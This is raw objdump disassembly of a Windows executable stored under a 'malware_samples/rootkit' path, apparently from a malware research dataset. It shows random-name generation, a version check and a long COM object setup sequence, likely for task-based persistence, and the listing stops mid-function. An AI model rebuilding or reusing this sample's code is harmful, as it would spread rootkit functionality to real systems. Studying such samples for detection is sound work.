
malware_samples/rootkit/b2cc4454c0a4fc80b1fc782c45ac7f76b1d95913d259090a2523819aeec88eb5.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	51                   	push   %ecx
  401004:	53                   	push   %ebx
  401005:	56                   	push   %esi
  401006:	57                   	push   %edi
  401007:	68 00 00 00 f0       	push   $0xf0000000
  40100c:	6a 01                	push   $0x1
  40100e:	68 c8 20 40 00       	push   $0x4020c8
  401013:	33 db                	xor    %ebx,%ebx
  401015:	8d 45 fc             	lea    -0x4(%ebp),%eax
  401018:	53                   	push   %ebx
  401019:	50                   	push   %eax
  40101a:	8b f2                	mov    %edx,%esi
  40101c:	8b f9                	mov    %ecx,%edi
  40101e:	ff 15 04 20 40 00    	call   *0x402004
  401024:	85 c0                	test   %eax,%eax
  401026:	74 1c                	je     0x401044
  401028:	57                   	push   %edi
  401029:	56                   	push   %esi
  40102a:	ff 75 fc             	push   -0x4(%ebp)
  40102d:	ff 15 08 20 40 00    	call   *0x402008
  401033:	53                   	push   %ebx
  401034:	ff 75 fc             	push   -0x4(%ebp)
  401037:	8b f0                	mov    %eax,%esi
  401039:	ff 15 10 20 40 00    	call   *0x402010
  40103f:	85 f6                	test   %esi,%esi
  401041:	0f 95 c3             	setne  %bl
  401044:	5f                   	pop    %edi
  401045:	5e                   	pop    %esi
  401046:	8b c3                	mov    %ebx,%eax
  401048:	5b                   	pop    %ebx
  401049:	c9                   	leave
  40104a:	c3                   	ret
  40104b:	55                   	push   %ebp
  40104c:	8b ec                	mov    %esp,%ebp
  40104e:	83 ec 70             	sub    $0x70,%esp
  401051:	53                   	push   %ebx
  401052:	56                   	push   %esi
  401053:	57                   	push   %edi
  401054:	8b d9                	mov    %ecx,%ebx
  401056:	8d 7d 90             	lea    -0x70(%ebp),%edi
  401059:	6a 1a                	push   $0x1a
  40105b:	59                   	pop    %ecx
  40105c:	be 20 21 40 00       	mov    $0x402120,%esi
  401061:	8b c2                	mov    %edx,%eax
  401063:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401065:	8b cb                	mov    %ebx,%ecx
  401067:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40106a:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
  40106c:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  40106f:	8b d7                	mov    %edi,%edx
  401071:	e8 8a ff ff ff       	call   0x401000
  401076:	85 c0                	test   %eax,%eax
  401078:	74 30                	je     0x4010aa
  40107a:	8b 75 fc             	mov    -0x4(%ebp),%esi
  40107d:	33 c9                	xor    %ecx,%ecx
  40107f:	85 f6                	test   %esi,%esi
  401081:	74 1e                	je     0x4010a1
  401083:	0f b7 04 4b          	movzwl (%ebx,%ecx,2),%eax
  401087:	33 d2                	xor    %edx,%edx
  401089:	c7 45 fc 34 00 00 00 	movl   $0x34,-0x4(%ebp)
  401090:	f7 75 fc             	divl   -0x4(%ebp)
  401093:	66 8b 44 55 90       	mov    -0x70(%ebp,%edx,2),%ax
  401098:	66 89 04 4b          	mov    %ax,(%ebx,%ecx,2)
  40109c:	41                   	inc    %ecx
  40109d:	3b ce                	cmp    %esi,%ecx
  40109f:	72 e2                	jb     0x401083
  4010a1:	33 c0                	xor    %eax,%eax
  4010a3:	66 89 04 1f          	mov    %ax,(%edi,%ebx,1)
  4010a7:	40                   	inc    %eax
  4010a8:	eb 02                	jmp    0x4010ac
  4010aa:	33 c0                	xor    %eax,%eax
  4010ac:	5f                   	pop    %edi
  4010ad:	5e                   	pop    %esi
  4010ae:	5b                   	pop    %ebx
  4010af:	c9                   	leave
  4010b0:	c3                   	ret
  4010b1:	55                   	push   %ebp
  4010b2:	8b ec                	mov    %esp,%ebp
  4010b4:	83 ec 0c             	sub    $0xc,%esp
  4010b7:	89 55 fc             	mov    %edx,-0x4(%ebp)
  4010ba:	56                   	push   %esi
  4010bb:	8b f2                	mov    %edx,%esi
  4010bd:	85 c9                	test   %ecx,%ecx
  4010bf:	75 0e                	jne    0x4010cf
  4010c1:	6a 30                	push   $0x30
  4010c3:	58                   	pop    %eax
  4010c4:	66 89 06             	mov    %ax,(%esi)
  4010c7:	33 c0                	xor    %eax,%eax
  4010c9:	66 89 46 02          	mov    %ax,0x2(%esi)
  4010cd:	eb 5d                	jmp    0x40112c
  4010cf:	53                   	push   %ebx
  4010d0:	57                   	push   %edi
  4010d1:	85 c9                	test   %ecx,%ecx
  4010d3:	79 0e                	jns    0x4010e3
  4010d5:	6a 2d                	push   $0x2d
  4010d7:	58                   	pop    %eax
  4010d8:	66 89 06             	mov    %ax,(%esi)
  4010db:	83 c6 02             	add    $0x2,%esi
  4010de:	89 75 fc             	mov    %esi,-0x4(%ebp)
  4010e1:	f7 d9                	neg    %ecx
  4010e3:	6a 0a                	push   $0xa
  4010e5:	8b c1                	mov    %ecx,%eax
  4010e7:	33 ff                	xor    %edi,%edi
  4010e9:	5b                   	pop    %ebx
  4010ea:	99                   	cltd
  4010eb:	47                   	inc    %edi
  4010ec:	f7 fb                	idiv   %ebx
  4010ee:	85 c0                	test   %eax,%eax
  4010f0:	75 f8                	jne    0x4010ea
  4010f2:	8d 1c 3f             	lea    (%edi,%edi,1),%ebx
  4010f5:	85 ff                	test   %edi,%edi
  4010f7:	7e 2b                	jle    0x401124
  4010f9:	8d 43 fe             	lea    -0x2(%ebx),%eax
  4010fc:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  4010ff:	03 c6                	add    %esi,%eax
  401101:	6a 0a                	push   $0xa
  401103:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401106:	8b d8                	mov    %eax,%ebx
  401108:	5e                   	pop    %esi
  401109:	8b c1                	mov    %ecx,%eax
  40110b:	99                   	cltd
  40110c:	f7 fe                	idiv   %esi
  40110e:	8b c8                	mov    %eax,%ecx
  401110:	8d 42 30             	lea    0x30(%edx),%eax
  401113:	66 89 03             	mov    %ax,(%ebx)
  401116:	8d 5b fe             	lea    -0x2(%ebx),%ebx
  401119:	83 ef 01             	sub    $0x1,%edi
  40111c:	75 eb                	jne    0x401109
  40111e:	8b 75 fc             	mov    -0x4(%ebp),%esi
  401121:	8b 5d f4             	mov    -0xc(%ebp),%ebx
  401124:	33 c0                	xor    %eax,%eax
  401126:	5f                   	pop    %edi
  401127:	66 89 04 33          	mov    %ax,(%ebx,%esi,1)
  40112b:	5b                   	pop    %ebx
  40112c:	5e                   	pop    %esi
  40112d:	c9                   	leave
  40112e:	c3                   	ret
  40112f:	55                   	push   %ebp
  401130:	8b ec                	mov    %esp,%ebp
  401132:	51                   	push   %ecx
  401133:	56                   	push   %esi
  401134:	8d 45 fc             	lea    -0x4(%ebp),%eax
  401137:	33 f6                	xor    %esi,%esi
  401139:	50                   	push   %eax
  40113a:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40113d:	ff 15 1c 20 40 00    	call   *0x40201c
  401143:	50                   	push   %eax
  401144:	ff 15 30 20 40 00    	call   *0x402030
  40114a:	85 c0                	test   %eax,%eax
  40114c:	74 06                	je     0x401154
  40114e:	39 75 fc             	cmp    %esi,-0x4(%ebp)
  401151:	74 01                	je     0x401154
  401153:	46                   	inc    %esi
  401154:	8b c6                	mov    %esi,%eax
  401156:	5e                   	pop    %esi
  401157:	c9                   	leave
  401158:	c3                   	ret
  401159:	55                   	push   %ebp
  40115a:	8b ec                	mov    %esp,%ebp
  40115c:	81 ec 14 01 00 00    	sub    $0x114,%esp
  401162:	8d 85 ec fe ff ff    	lea    -0x114(%ebp),%eax
  401168:	c7 85 ec fe ff ff 14 	movl   $0x114,-0x114(%ebp)
  40116f:	01 00 00 
  401172:	50                   	push   %eax
  401173:	e8 16 00 00 00       	call   0x40118e
  401178:	ff d0                	call   *%eax
  40117a:	85 c0                	test   %eax,%eax
  40117c:	78 0c                	js     0x40118a
  40117e:	83 bd f0 fe ff ff 0a 	cmpl   $0xa,-0x110(%ebp)
  401185:	1b c0                	sbb    %eax,%eax
  401187:	40                   	inc    %eax
  401188:	c9                   	leave
  401189:	c3                   	ret
  40118a:	33 c0                	xor    %eax,%eax
  40118c:	c9                   	leave
  40118d:	c3                   	ret
  40118e:	68 a0 21 40 00       	push   $0x4021a0
  401193:	ff 15 24 20 40 00    	call   *0x402024
  401199:	85 c0                	test   %eax,%eax
  40119b:	74 0d                	je     0x4011aa
  40119d:	68 ac 21 40 00       	push   $0x4021ac
  4011a2:	50                   	push   %eax
  4011a3:	ff 15 2c 20 40 00    	call   *0x40202c
  4011a9:	c3                   	ret
  4011aa:	33 c0                	xor    %eax,%eax
  4011ac:	c3                   	ret
  4011ad:	55                   	push   %ebp
  4011ae:	8b ec                	mov    %esp,%ebp
  4011b0:	81 ec 84 00 00 00    	sub    $0x84,%esp
  4011b6:	53                   	push   %ebx
  4011b7:	56                   	push   %esi
  4011b8:	8b 35 58 20 40 00    	mov    0x402058,%esi
  4011be:	33 db                	xor    %ebx,%ebx
  4011c0:	57                   	push   %edi
  4011c1:	51                   	push   %ecx
  4011c2:	ff d6                	call   *%esi
  4011c4:	68 28 22 40 00       	push   $0x402228
  4011c9:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4011cc:	ff d6                	call   *%esi
  4011ce:	8b f8                	mov    %eax,%edi
  4011d0:	68 10 22 40 00       	push   $0x402210
  4011d5:	89 7d cc             	mov    %edi,-0x34(%ebp)
  4011d8:	ff d6                	call   *%esi
  4011da:	ff 75 0c             	push   0xc(%ebp)
  4011dd:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4011e0:	ff d6                	call   *%esi
  4011e2:	68 8c 21 40 00       	push   $0x40218c
  4011e7:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  4011ea:	ff d6                	call   *%esi
  4011ec:	68 90 21 40 00       	push   $0x402190
  4011f1:	89 45 c0             	mov    %eax,-0x40(%ebp)
  4011f4:	ff d6                	call   *%esi
  4011f6:	53                   	push   %ebx
  4011f7:	53                   	push   %ebx
  4011f8:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4011fb:	ff 15 80 20 40 00    	call   *0x402080
  401201:	85 c0                	test   %eax,%eax
  401203:	0f 88 e7 02 00 00    	js     0x4014f0
  401209:	53                   	push   %ebx
  40120a:	53                   	push   %ebx
  40120b:	53                   	push   %ebx
  40120c:	6a 03                	push   $0x3
  40120e:	6a 06                	push   $0x6
  401210:	53                   	push   %ebx
  401211:	53                   	push   %ebx
  401212:	6a ff                	push   $0xffffffff
  401214:	53                   	push   %ebx
  401215:	ff 15 74 20 40 00    	call   *0x402074
  40121b:	85 c0                	test   %eax,%eax
  40121d:	79 0b                	jns    0x40122a
  40121f:	3d 19 01 01 80       	cmp    $0x80010119,%eax
  401224:	0f 85 bb 02 00 00    	jne    0x4014e5
  40122a:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40122d:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  401230:	50                   	push   %eax
  401231:	68 88 20 40 00       	push   $0x402088
  401236:	6a 01                	push   $0x1
  401238:	53                   	push   %ebx
  401239:	68 a8 20 40 00       	push   $0x4020a8
  40123e:	ff 15 78 20 40 00    	call   *0x402078
  401244:	85 c0                	test   %eax,%eax
  401246:	0f 88 99 02 00 00    	js     0x4014e5
  40124c:	8d 45 ac             	lea    -0x54(%ebp),%eax
  40124f:	50                   	push   %eax
  401250:	ff 15 54 20 40 00    	call   *0x402054
  401256:	83 ec 10             	sub    $0x10,%esp
  401259:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40125c:	8b fc                	mov    %esp,%edi
  40125e:	8d 75 ac             	lea    -0x54(%ebp),%esi
  401261:	83 ec 10             	sub    $0x10,%esp
  401264:	8b 08                	mov    (%eax),%ecx
  401266:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401267:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401268:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401269:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40126a:	8b fc                	mov    %esp,%edi
  40126c:	8d 75 ac             	lea    -0x54(%ebp),%esi
  40126f:	83 ec 10             	sub    $0x10,%esp
  401272:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401273:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401274:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401275:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401276:	8b fc                	mov    %esp,%edi
  401278:	8d 75 ac             	lea    -0x54(%ebp),%esi
  40127b:	83 ec 10             	sub    $0x10,%esp
  40127e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40127f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401280:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401281:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401282:	8b fc                	mov    %esp,%edi
  401284:	8d 75 ac             	lea    -0x54(%ebp),%esi
  401287:	50                   	push   %eax
  401288:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401289:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40128a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40128b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40128c:	ff 51 28             	call   *0x28(%ecx)
  40128f:	85 c0                	test   %eax,%eax
  401291:	0f 88 3d 02 00 00    	js     0x4014d4
  401297:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40129a:	8d 55 d8             	lea    -0x28(%ebp),%edx
  40129d:	52                   	push   %edx
  40129e:	ff 75 c0             	push   -0x40(%ebp)
  4012a1:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  4012a4:	8b 08                	mov    (%eax),%ecx
  4012a6:	50                   	push   %eax
  4012a7:	ff 51 1c             	call   *0x1c(%ecx)
  4012aa:	85 c0                	test   %eax,%eax
  4012ac:	0f 88 22 02 00 00    	js     0x4014d4
  4012b2:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4012b5:	8d 55 f8             	lea    -0x8(%ebp),%edx
  4012b8:	52                   	push   %edx
  4012b9:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  4012bc:	53                   	push   %ebx
  4012bd:	8b 08                	mov    (%eax),%ecx
  4012bf:	50                   	push   %eax
  4012c0:	ff 51 24             	call   *0x24(%ecx)
  4012c3:	85 c0                	test   %eax,%eax
  4012c5:	0f 88 fb 01 00 00    	js     0x4014c6
  4012cb:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4012ce:	8d 55 ec             	lea    -0x14(%ebp),%edx
  4012d1:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  4012d4:	52                   	push   %edx
  4012d5:	50                   	push   %eax
  4012d6:	8b 08                	mov    (%eax),%ecx
  4012d8:	ff 51 2c             	call   *0x2c(%ecx)
  4012db:	85 c0                	test   %eax,%eax
  4012dd:	0f 88 d5 01 00 00    	js     0x4014b8
  4012e3:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4012e6:	6a ff                	push   $0xffffffff
  4012e8:	50                   	push   %eax
  4012e9:	8b 08                	mov    (%eax),%ecx
  4012eb:	ff 51 58             	call   *0x58(%ecx)
  4012ee:	85 c0                	test   %eax,%eax
  4012f0:	0f 88 b4 01 00 00    	js     0x4014aa
  4012f6:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4012f9:	53                   	push   %ebx
  4012fa:	50                   	push   %eax
  4012fb:	8b 08                	mov    (%eax),%ecx
  4012fd:	ff 51 48             	call   *0x48(%ecx)
  401300:	85 c0                	test   %eax,%eax
  401302:	0f 88 a2 01 00 00    	js     0x4014aa
  401308:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40130b:	8d 55 dc             	lea    -0x24(%ebp),%edx
  40130e:	89 5d dc             	mov    %ebx,-0x24(%ebp)
  401311:	52                   	push   %edx
  401312:	50                   	push   %eax
  401313:	8b 08                	mov    (%eax),%ecx
  401315:	ff 51 24             	call   *0x24(%ecx)
  401318:	85 c0                	test   %eax,%eax
  40131a:	0f 88 8a 01 00 00    	js     0x4014aa
  401320:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401323:	8d 55 e0             	lea    -0x20(%ebp),%edx
  401326:	52                   	push   %edx
  401327:	6a 08                	push   $0x8
  401329:	5f                   	pop    %edi
  40132a:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  40132d:	8b 08                	mov    (%eax),%ecx
  40132f:	57                   	push   %edi
  401330:	50                   	push   %eax
  401331:	ff 51 28             	call   *0x28(%ecx)
  401334:	85 c0                	test   %eax,%eax
  401336:	0f 88 60 01 00 00    	js     0x40149c
  40133c:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40133f:	8d 55 d0             	lea    -0x30(%ebp),%edx
  401342:	52                   	push   %edx
  401343:	89 5d d0             	mov    %ebx,-0x30(%ebp)
  401346:	68 98 20 40 00       	push   $0x402098
  40134b:	8b 08                	mov    (%eax),%ecx
  40134d:	50                   	push   %eax
  40134e:	ff 11                	call   *(%ecx)
  401350:	85 c0                	test   %eax,%eax
  401352:	0f 88 36 01 00 00    	js     0x40148e
  401358:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40135b:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  40135e:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  401361:	52                   	push   %edx
  401362:	50                   	push   %eax
  401363:	8b 08                	mov    (%eax),%ecx
  401365:	ff 51 44             	call   *0x44(%ecx)
  401368:	85 c0                	test   %eax,%eax
  40136a:	0f 88 10 01 00 00    	js     0x401480
  401370:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401373:	8d 55 e8             	lea    -0x18(%ebp),%edx
  401376:	52                   	push   %edx
  401377:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  40137a:	53                   	push   %ebx
  40137b:	8b 08                	mov    (%eax),%ecx
  40137d:	50                   	push   %eax
  40137e:	ff 51 30             	call   *0x30(%ecx)
  401381:	85 c0                	test   %eax,%eax
  401383:	0f 88 e9 00 00 00    	js     0x401472
  401389:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40138c:	8d 55 f4             	lea    -0xc(%ebp),%edx
  40138f:	52                   	push   %edx
  401390:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  401393:	68 b8 20 40 00       	push   $0x4020b8
  401398:	8b 08                	mov    (%eax),%ecx
  40139a:	50                   	push   %eax
  40139b:	ff 11                	call   *(%ecx)
  40139d:	85 c0                	test   %eax,%eax
  40139f:	0f 88 bf 00 00 00    	js     0x401464
  4013a5:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4013a8:	ff 75 cc             	push   -0x34(%ebp)
  4013ab:	50                   	push   %eax
  4013ac:	8b 08                	mov    (%eax),%ecx
  4013ae:	ff 51 3c             	call   *0x3c(%ecx)
  4013b1:	85 c0                	test   %eax,%eax
  4013b3:	0f 88 9d 00 00 00    	js     0x401456
  4013b9:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4013bc:	ff 75 c8             	push   -0x38(%ebp)
  4013bf:	50                   	push   %eax
  4013c0:	8b 08                	mov    (%eax),%ecx
  4013c2:	ff 51 2c             	call   *0x2c(%ecx)
  4013c5:	85 c0                	test   %eax,%eax
  4013c7:	0f 88 89 00 00 00    	js     0x401456
  4013cd:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4013d0:	ff 75 c4             	push   -0x3c(%ebp)
  4013d3:	50                   	push   %eax
  4013d4:	8b 08                	mov    (%eax),%ecx
  4013d6:	ff 51 34             	call   *0x34(%ecx)
  4013d9:	85 c0                	test   %eax,%eax
  4013db:	78 79                	js     0x401456
  4013dd:	8b 35 54 20 40 00    	mov    0x402054,%esi
  4013e3:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  4013e9:	50                   	push   %eax
  4013ea:	ff d6                	call   *%esi
  4013ec:	8d 45 9c             	lea    -0x64(%ebp),%eax
  4013ef:	50                   	push   %eax
  4013f0:	ff d6                	call   *%esi
  4013f2:	8b 45 bc             	mov    -0x44(%ebp),%eax
  4013f5:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  4013f8:	8d 45 8c             	lea    -0x74(%ebp),%eax
  4013fb:	50                   	push   %eax
  4013fc:	66 89 7d 9c          	mov    %di,-0x64(%ebp)
  401400:	ff d6                	call   *%esi
  401402:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  401405:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401408:	52                   	push   %edx
  401409:	83 ec 10             	sub    $0x10,%esp
  40140c:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  40140f:	8b fc                	mov    %esp,%edi
  401411:	8d 75 8c             	lea    -0x74(%ebp),%esi
  401414:	8b 08                	mov    (%eax),%ecx
  401416:	6a 05                	push   $0x5
  401418:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401419:	83 ec 10             	sub    $0x10,%esp
  40141c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40141d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40141e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40141f:	8b fc                	mov    %esp,%edi
  401421:	8d b5 7c ff ff ff    	lea    -0x84(%ebp),%esi
  401427:	83 ec 10             	sub    $0x10,%esp
  40142a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40142b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40142c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40142d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40142e:	8b fc                	mov    %esp,%edi
  401430:	8d 75 9c             	lea    -0x64(%ebp),%esi
  401433:	6a 06                	push   $0x6
  401435:	ff 75 f8             	push   -0x8(%ebp)
  401438:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401439:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40143a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40143b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40143c:	8b 75 fc             	mov    -0x4(%ebp),%esi
  40143f:	56                   	push   %esi
  401440:	50                   	push   %eax
  401441:	ff 51 44             	call   *0x44(%ecx)
  401444:	85 c0                	test   %eax,%eax
  401446:	78 11                	js     0x401459
  401448:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40144b:	33 db                	xor    %ebx,%ebx
  40144d:	50                   	push   %eax
  40144e:	43                   	inc    %ebx
  40144f:	8b 08                	mov    (%eax),%ecx
  401451:	ff 51 08             	call   *0x8(%ecx)
  401454:	eb 03                	jmp    0x401459
  401456:	8b 75 fc             	mov    -0x4(%ebp),%esi
  401459:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40145c:	50                   	push   %eax
  40145d:	8b 08                	mov    (%eax),%ecx
  40145f:	ff 51 08             	call   *0x8(%ecx)
  401462:	eb 03                	jmp    0x401467
  401464:	8b 75 fc             	mov    -0x4(%ebp),%esi
  401467:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40146a:	50                   	push   %eax
  40146b:	8b 08                	mov    (%eax),%ecx
  40146d:	ff 51 08             	call   *0x8(%ecx)
  401470:	eb 03                	jmp    0x401475
  401472:	8b 75 fc             	mov    -0x4(%ebp),%esi
  401475:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401478:	50                   	push   %eax
  401479:	8b 08                	mov    (%eax),%ecx
  40147b:	ff 51 08             	call   *0x8(%ecx)
  40147e:	eb 03                	jmp    0x401483
  401480:	8b 75 fc             	mov    -0x4(%ebp),%esi
  401483:	8b 45 d0             	mov    -0x30(%ebp),%eax
  401486:	50                   	push   %eax
  401487:	8b 08                	mov    (%eax),%ecx
  401489:	ff 51 08             	call   *0x8(%ecx)
  40148c:	eb 03                	jmp    0x401491
  40148e:	8b 75 fc             	mov    -0x4(%ebp),%esi
  401491:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401494:	50                   	push   %eax
  401495:	8b 08                	mov    (%eax),%ecx
  401497:	ff 51 08             	call   *0x8(%ecx)
  40149a:	eb 03                	jmp    0x40149f
  40149c:	8b 75 fc             	mov    -0x4(%ebp),%esi
  40149f:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4014a2:	50                   	push   %eax
  4014a3:	8b 08                	mov    (%eax),%ecx
  4014a5:	ff 51 08             	call   *0x8(%ecx)
  4014a8:	eb 03                	jmp    0x4014ad
  4014aa:	8b 75 fc             	mov    -0x4(%ebp),%esi
  4014ad:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4014b0:	50                   	push   %eax
  4014b1:	8b 08                	mov    (%eax),%ecx
  4014b3:	ff 51 08             	call   *0x8(%ecx)
  4014b6:	eb 03                	jmp    0x4014bb
  4014b8:	8b 75 fc             	mov    -0x4(%ebp),%esi
  4014bb:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4014be:	50                   	push   %eax
  4014bf:	8b 08                	mov    (%eax),%ecx
  4014c1:	ff 51 08             	call   *0x8(%ecx)
  4014c4:	eb 03                	jmp    0x4014c9
  4014c6:	8b 75 fc             	mov    -0x4(%ebp),%esi
  4014c9:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4014cc:	50                   	push   %eax
  4014cd:	8b 08                	mov    (%eax),%ecx
  4014cf:	ff 51 08             	call   *0x8(%ecx)
  4014d2:	eb 03                	jmp    0x4014d7
  4014d4:	8b 75 fc             	mov    -0x4(%ebp),%esi
  4014d7:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4014da:	50                   	push   %eax
  4014db:	8b 08                	mov    (%eax),%ecx
  4014dd:	ff 51 08             	call   *0x8(%ecx)
  4014e0:	8b 7d cc             	mov    -0x34(%ebp),%edi
  4014e3:	eb 03                	jmp    0x4014e8
  4014e5:	8b 75 fc             	mov    -0x4(%ebp),%esi
  4014e8:	ff 15 7c 20 40 00    	call   *0x40207c
  4014ee:	eb 03                	jmp    0x4014f3
  4014f0:	8b 75 fc             	mov    -0x4(%ebp),%esi
  4014f3:	56                   	push   %esi
  4014f4:	8b 35 50 20 40 00    	mov    0x402050,%esi
  4014fa:	ff d6                	call   *%esi
  4014fc:	57                   	push   %edi
  4014fd:	ff d6                	call   *%esi
  4014ff:	ff 75 c8             	push   -0x38(%ebp)
  401502:	ff d6                	call   *%esi
  401504:	ff 75 c4             	push   -0x3c(%ebp)
  401507:	ff d6                	call   *%esi
  401509:	ff 75 c0             	push   -0x40(%ebp)
  40150c:	ff d6                	call   *%esi
  40150e:	ff 75 bc             	push   -0x44(%ebp)
  401511:	ff d6                	call   *%esi
  401513:	5f                   	pop    %edi
  401514:	5e                   	pop    %esi
  401515:	8b c3                	mov    %ebx,%eax
  401517:	5b                   	pop    %ebx
  401518:	c9                   	leave
  401519:	c3                   	ret
  40151a:	55                   	push   %ebp
  40151b:	8b ec                	mov    %esp,%ebp
  40151d:	83 ec 38             	sub    $0x38,%esp
  401520:	53                   	push   %ebx
  401521:	56                   	push   %esi
  401522:	8b 35 58 20 40 00    	mov    0x402058,%esi
  401528:	33 db                	xor    %ebx,%ebx
  40152a:	57                   	push   %edi
  40152b:	51                   	push   %ecx
  40152c:	ff d6                	call   *%esi
  40152e:	8b f8                	mov    %eax,%edi
  401530:	68 8c 21 40 00       	push   $0x40218c
  401535:	89 7d ec             	mov    %edi,-0x14(%ebp)
  401538:	ff d6                	call   *%esi
  40153a:	53                   	push   %ebx
  40153b:	53                   	push   %ebx
  40153c:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40153f:	ff 15 80 20 40 00    	call   *0x402080
  401545:	85 c0                	test   %eax,%eax
  401547:	0f 88 12 01 00 00    	js     0x40165f
  40154d:	53                   	push   %ebx
  40154e:	53                   	push   %ebx
  40154f:	53                   	push   %ebx
  401550:	6a 03                	push   $0x3
  401552:	6a 06                	push   $0x6
  401554:	53                   	push   %ebx
  401555:	53                   	push   %ebx
  401556:	6a ff                	push   $0xffffffff
  401558:	53                   	push   %ebx
  401559:	ff 15 74 20 40 00    	call   *0x402074
  40155f:	85 c0                	test   %eax,%eax
  401561:	79 0b                	jns    0x40156e
  401563:	3d 19 01 01 80       	cmp    $0x80010119,%eax
  401568:	0f 85 eb 00 00 00    	jne    0x401659
  40156e:	8d 45 fc             	lea    -0x4(%ebp),%eax
  401571:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401574:	50                   	push   %eax
  401575:	68 88 20 40 00       	push   $0x402088
  40157a:	6a 01                	push   $0x1
  40157c:	53                   	push   %ebx
  40157d:	68 a8 20 40 00       	push   $0x4020a8
  401582:	ff 15 78 20 40 00    	call   *0x402078
  401588:	85 c0                	test   %eax,%eax
  40158a:	0f 88 c9 00 00 00    	js     0x401659
  401590:	8d 45 d8             	lea    -0x28(%ebp),%eax
  401593:	50                   	push   %eax
  401594:	ff 15 54 20 40 00    	call   *0x402054
  40159a:	83 ec 10             	sub    $0x10,%esp
  40159d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4015a0:	8b fc                	mov    %esp,%edi
  4015a2:	8d 75 d8             	lea    -0x28(%ebp),%esi
  4015a5:	83 ec 10             	sub    $0x10,%esp
  4015a8:	8b 08                	mov    (%eax),%ecx
  4015aa:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4015ab:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4015ac:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4015ad:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4015ae:	8b fc                	mov    %esp,%edi
  4015b0:	8d 75 d8             	lea    -0x28(%ebp),%esi
  4015b3:	83 ec 10             	sub    $0x10,%esp
  4015b6:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4015b7:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4015b8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
